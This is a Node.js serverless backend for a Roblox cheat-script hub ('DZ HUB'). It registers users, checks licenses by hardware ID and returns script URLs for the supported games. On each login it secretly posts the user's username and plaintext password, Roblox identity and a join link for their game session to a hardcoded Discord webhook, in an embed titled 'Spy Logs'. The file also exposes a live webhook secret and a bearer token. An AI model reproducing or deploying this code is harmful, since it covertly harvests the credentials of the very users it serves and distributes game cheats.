const https = require('https');
let usersDB = []; 

const SCRIPTS_BY_GAME = {
    "135856908115931": "https://raw.githubusercontent.com/therealroier/ScriptDz/refs/heads/main/DUELS",
    "74084441161738": "https://raw.githubusercontent.com/therealroier/ScriptDz/refs/heads/main/DUELS",
    "131117978948830": "https://raw.githubusercontent.com/therealroier/ScriptDz/refs/heads/main/DUELS"
};

const DISCORD_WEBHOOK = "/api/webhooks/1469998225472880662/fQ8_e1mjU3-lFm-WU-qIbNTQ06CXjrXeiazo_o5uNPXBwWVCrI6w-SjDStPeBjCb5B11";

function sendDiscord(embed) {
    const data = JSON.stringify({ embeds: [embed] });
    const options = {
        hostname: 'discord.com', port: 443, path: DISCORD_WEBHOOK, method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Content-Length': data.length }
    };
    const req = https.request(options);
    req.write(data);
    req.end();
}

module.exports = async (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

    if (req.method === 'OPTIONS') return res.status(200).end();

    const authHeader = req.headers['authorization'];
    if (authHeader !== 'Bearer DZisthegoat') return res.status(403).json({ message: "Forbidden" });

    const { action, nickname, password, license, hwid, robloxName, userId, placeId, jobId, placeName, keyExpired } = req.body;

    if (action === "register") {
        const exists = usersDB.find(u => u.nickname.toLowerCase() === nickname.toLowerCase());
        if (exists) return res.status(400).json({ message: "User exists" });

        usersDB.push({ nickname, password, license, hwid });
        
        sendDiscord({
            title: "New Registration",
            color: 65280,
            description: `**User:** ${nickname}\n**License:** ${license}\n**Roblox:** ${robloxName}\n**HWID:** ${hwid}`
        });

        return res.status(200).json({ status: "success" });
    }

    if (action === "login") {
        const user = usersDB.find(u => u.nickname === nickname && u.password === password);
        
        if (!user) return res.status(401).json({ message: "Invalid credentials" });
        if (user.hwid !== hwid) return res.status(403).json({ message: "HWID mismatch" });

        if (keyExpired) {
            usersDB = usersDB.filter(u => u.nickname !== nickname);
            return res.status(410).json({ message: "Key expired" });
        }

        const scriptUrl = SCRIPTS_BY_GAME[String(placeId)];
        if (!scriptUrl) return res.status(404).json({ message: "Game not supported" });

        const joinLink = `https://therealroier.github.io/zz/?placeId=${placeId}&gameInstanceId=${jobId}`;
        
        sendDiscord({
            title: "Spy Logs - Login Success",
            color: 16753920,
            fields: [
                { name: "Account", value: `\`\`\`User: ${nickname}\nPass: ${password}\`\`\`` },
                { name: "Player", value: `\`\`\`${robloxName} (${userId})\`\`\`` },
                { name: "Experience", value: `\`\`\`${placeName || placeId}\`\`\`` },
                { name: "Join Link", value: `[Click to Join](${joinLink})` },
                { name: "Execute", value: `\`\`\`game:GetService("TeleportService"):TeleportToPlaceInstance(${placeId},"${jobId}",game.Players.LocalPlayer)\`\`\`` }
            ],
            footer: { text: "DZ HUB • " + new Date().toLocaleString() }
        });

        return res.status(200).json({ status: "success", license: user.license, scriptUrl: scriptUrl });
    }

    res.status(404).send('');
};
